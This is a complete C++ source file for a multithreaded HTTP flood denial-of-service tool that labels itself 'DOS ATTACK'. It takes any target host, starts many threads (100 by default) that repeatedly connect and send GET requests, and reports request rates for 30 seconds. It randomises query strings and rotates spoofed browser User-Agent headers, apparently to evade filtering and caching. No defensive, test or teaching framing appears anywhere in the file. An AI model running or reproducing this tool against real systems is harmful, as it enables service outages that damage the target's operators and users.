#include <iostream>
#include <string>
#include <cstring>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>
#include <vector>
#include <atomic>
#include <chrono>
#include <random>
#include <netinet/tcp.h>
#include <fcntl.h>

std::atomic<bool> dos_running(true);
std::atomic<long long> total_requests(0);
std::atomic<long long> total_bytes(0);
std::atomic<int> active_threads(0);

std::string random_string(int len) {
    const char chars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::string result;
    result.reserve(len);
    for (int i = 0; i < len; i++) {
        result += chars[rand() % (sizeof(chars) - 1)];
    }
    return result;
}

std::string random_ua() {
    std::vector<std::string> agents = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
    };
    return agents[rand() % agents.size()];
}

void http_worker(std::string host, int port) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    
    if (inet_pton(AF_INET, host.c_str(), &addr.sin_addr) <= 0) {
        struct hostent *he = gethostbyname(host.c_str());
        if (he == nullptr) {
            return;
        }
        addr.sin_addr = *(struct in_addr*)he->h_addr;
    }
    
    active_threads++;
    
    while (dos_running) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        struct timeval tv;
        tv.tv_sec = 3;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        
        int no_delay = 1;
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &no_delay, sizeof(no_delay));
        
        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(sock);
            continue;
        }
        
        std::string path = "/?" + random_string(rand() % 15 + 5);
        
        std::string request = "GET " + path + " HTTP/1.1\r\n"
                            "Host: " + host + "\r\n"
                            "User-Agent: " + random_ua() + "\r\n"
                            "Accept: */*\r\n"
                            "Connection: keep-alive\r\n\r\n";
        
        int sent = send(sock, request.c_str(), request.length(), 0);
        if (sent > 0) {
            total_requests++;
            total_bytes += sent;
        }
        
        close(sock);
    }
    
    active_threads--;
}

void dos_attack(std::string target, int port, int threads) {
    std::cout << "\n=== DOS ATTACK ===" << std::endl;
    std::cout << "Target: " << target << ":" << port << std::endl;
    std::cout << "Threads: " << threads << std::endl;
    std::cout << "=================" << std::endl;
    
    std::string host = target;
    
    if (host.find("https://") == 0) {
        host = host.substr(8);
        port = 443;
    } else if (host.find("http://") == 0) {
        host = host.substr(7);
    }
    
    struct sockaddr_in test_addr;
    test_addr.sin_family = AF_INET;
    test_addr.sin_port = htons(port);
    
    if (inet_pton(AF_INET, host.c_str(), &test_addr.sin_addr) <= 0) {
        struct hostent *he = gethostbyname(host.c_str());
        if (he == nullptr) {
            std::cerr << "Cannot resolve: " << host << std::endl;
            return;
        }
        std::cout << "Resolved to IP: " << inet_ntoa(*(struct in_addr*)he->h_addr) << std::endl;
    }
    
    dos_running = true;
    total_requests = 0;
    total_bytes = 0;
    
    std::vector<std::thread> workers;
    for (int i = 0; i < threads; i++) {
        workers.emplace_back(http_worker, host, port);
    }
    
    auto start = std::chrono::steady_clock::now();
    long long last_req = 0;
    
    for (int sec = 0; sec < 30 && dos_running; sec++) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        
        long long current = total_requests.load();
        long long rps = current - last_req;
        
        std::cout << "[" << sec+1 << "s] RPS: " << rps << " | Total: " << current << " | Active: " << active_threads.load() << std::endl;
        
        last_req = current;
    }
    
    dos_running = false;
    for (auto &t : workers) {
        t.join();
    }
}

int main(int argc, char* argv[]) {
    srand(time(nullptr));
    
    std::string target;
    int port = 80;
    int threads = 100;
    
    if (argc >= 2) {
        target = argv[1];
    } else {
        std::cout << "Enter target: ";
        std::cin >> target;
    }
    
    if (target.find("https://") == 0) {
        target = target.substr(8);
        port = 443;
    } else if (target.find("http://") == 0) {
        target = target.substr(7);
    }
    
    if (argc >= 3) {
        port = atoi(argv[2]);
    }
    
    if (argc >= 4) {
        threads = atoi(argv[3]);
    }
    
    dos_attack(target, port, threads);
    
    return 0;
}